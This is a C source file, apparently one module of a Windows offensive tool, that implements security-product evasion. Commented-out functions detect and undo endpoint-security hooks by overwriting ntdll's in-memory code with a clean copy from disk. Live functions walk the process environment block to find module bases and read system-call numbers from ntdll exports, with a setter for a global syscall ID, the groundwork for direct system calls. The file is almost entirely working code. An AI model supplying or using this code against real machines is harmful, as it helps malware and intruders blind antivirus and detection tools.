#include "evasion.h"

// bool IsNtDllHooked() {
//     printf("[*] Cheking if NtdDll is hooked\n");
//     HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
//     if (!hNtDll) return false;

//     char sysPath[MAX_PATH];
//     GetSystemDirectoryA(sysPath, MAX_PATH);
//     strcat(sysPath, "\\ntdll.dll");

//     HANDLE hFile = CreateFileA(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//     if (hFile == INVALID_HANDLE_VALUE) return false;

//     DWORD fileSize = GetFileSize(hFile, NULL);
//     void* diskBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);

//     DWORD bytesRead;
//     ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL);
//     CloseHandle(hFile);

//     void* memoryNtDll = (void*)hNtDll;
//     bool hooked = memcmp(memoryNtDll, diskBuffer, fileSize) != 0;

//     VirtualFree(diskBuffer, 0, MEM_RELEASE);
//     if (hooked){
//         printf("[!] NtdDll is hooked\n");
//     } else {
//         printf("[*] NtdDll is not hooked\n");
//     }
//     return hooked;
// }

// void UnhookNtdll() {
//     printf("[*] Unhooking Ntdll\n");

//     // Get ntdll module handle
//     HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
//     if (!hNtDll) {
//         printf("[!] Failed to get handle to ntdll.dll.\n");
//         return;
//     }

//     printf("[*] Retrieving System Path\n");
//     char sysPath[MAX_PATH];
//     GetSystemDirectoryA(sysPath, MAX_PATH);
//     strcat(sysPath, "\\ntdll.dll");

//     printf("[*] Open Clean Ntdll\n");
//     HANDLE hFile = CreateFileA(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//     if (hFile == INVALID_HANDLE_VALUE) {
//         printf("[!] Failed to open clean ntdll.dll\n");
//         return;
//     }

//     // Get file size and allocate buffer
//     DWORD fileSize = GetFileSize(hFile, NULL);
//     void* diskBuffer = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

//     printf("[*] Read Clean Ntdll Content\n");
//     DWORD bytesRead;
//     ReadFile(hFile, diskBuffer, fileSize, &bytesRead, NULL);
//     CloseHandle(hFile);

//     // Get in-memory NTDLL base address
//     void* memoryNtDll = (void*)hNtDll;

//     // Locate the `.text` section header
//     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)diskBuffer;
//     IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)diskBuffer + dosHeader->e_lfanew);
//     IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

//     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
//         if (!strcmp((char*)sectionHeader[i].Name, ".text")) {
//             printf("[*] Found .text section: Restoring original bytes.\n");

//             DWORD oldProtect;
//             void* textSectionAddr = (BYTE*)memoryNtDll + sectionHeader[i].VirtualAddress;
//             SIZE_T textSize = sectionHeader[i].Misc.VirtualSize;

//             printf("[*] Changing memory protection to PAGE_EXECUTE_READWRITE\n");
//             VirtualProtect(textSectionAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);

//             // Restore original bytes
//             memcpy(textSectionAddr, (BYTE*)diskBuffer + sectionHeader[i].PointerToRawData, textSize);

//             printf("[*] Restored original .text section of ntdll.dll\n");
//             VirtualProtect(textSectionAddr, textSize, oldProtect, &oldProtect);
//             break;
//         }
//     }

//     printf("[*] Freeing allocated memory\n");
//     VirtualFree(diskBuffer, 0, MEM_RELEASE);
//     printf("[*] Ntdll unhooked successfully.\n");
// }

PVOID GetModuleBaseAddress(LPCWSTR moduleName) {
    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = &pLdr->InMemoryOrderModuleList;

    for (PLIST_ENTRY pEntry = pListEntry->Flink; pEntry != pListEntry; pEntry = pEntry->Flink) {
        PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        // Extract the base name from the FullDllName
        LPCWSTR fullDllName = pDataTableEntry->FullDllName.Buffer;
        LPCWSTR baseDllName = wcsrchr(fullDllName, L'\\');
        baseDllName = (baseDllName != NULL) ? (baseDllName + 1) : fullDllName;

        if (wcsicmp(baseDllName, moduleName) == 0) {
            return pDataTableEntry->DllBase;
        }
    }
    return NULL;
}

DWORD GetSyscallNumber(LPCSTR functionName) {
    PVOID ntdllBase = GetModuleBaseAddress(L"ntdll.dll");
    if (!ntdllBase) return 0;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdllBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntdllBase + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)ntdllBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((BYTE*)ntdllBase + addressOfNames[i]);
        if (strcmp(name, functionName) == 0) {
            DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
            BYTE* functionPtr = (BYTE*)ntdllBase + functionRVA;
            // Syscall ID is stored at byte 4 (mov eax, XX)
            return *(DWORD*)(functionPtr + 4);
        }
    }
    return 0;
}

void SetSystemCall(DWORD value) {
    smID = value;
}
